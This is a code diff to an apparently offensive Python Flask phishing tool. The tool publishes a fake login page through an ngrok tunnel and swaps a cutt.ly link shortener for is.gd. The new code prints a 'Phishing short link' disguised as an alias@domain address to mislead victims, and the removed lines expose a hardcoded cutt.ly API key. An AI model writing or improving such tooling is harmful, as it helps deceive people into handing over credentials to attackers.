@@ -3,10 +3,8 @@ try:
    from flask import Flask, request, render_template , redirect
    import argparse
    from waitress import serve
-   import os, time, socket, os.path
+   import os, socket, os.path
    from banner import *
-   import requests
-   import json
    os.system('cls' if os.name == 'nt' else 'clear')
    PrintBanner()
 
@@ -53,20 +51,17 @@ try:
 
       return render_template("index.html")
 
-   def cuttly(url,alias):
-      import urllib
+   def short(url,alias):
       import requests
-      key = '3b711dfb8eebfcd8c37ba2ad794f255f1c4d5'
-      url = urllib.parse.quote(url)
-      name  = alias.replace(".","-")+"-"+url.split("//")[1].replace(".ngrok.io","")
-      r = requests.get('http://cutt.ly/api/api.php?key={}&short={}&name={}'.format(key, url, name))
-      print(" [ * ] Short link by cutt.ly: "+r.json()["url"]["shortLink"])
+      x = requests.get(f'https://is.gd/create.php?format=json&url={url}')
+      r = x.json()
+      print(" [ * ] Phishing short link: "+alias+"@"+r["shorturl"].replace("https://",""))
 
    def start_ngrok(port):
     from pyngrok import ngrok
     url = ngrok.connect(port,bind_tls=True).public_url
-    print(' [ * ] Public address: ', url)
-    cuttly(url,site.split("//")[1])
+    print(' [ * ] Ngrok public address: ', url)
+    short(url,site)
 
    if __name__=='__main__':
       parser = argparse.ArgumentParser()
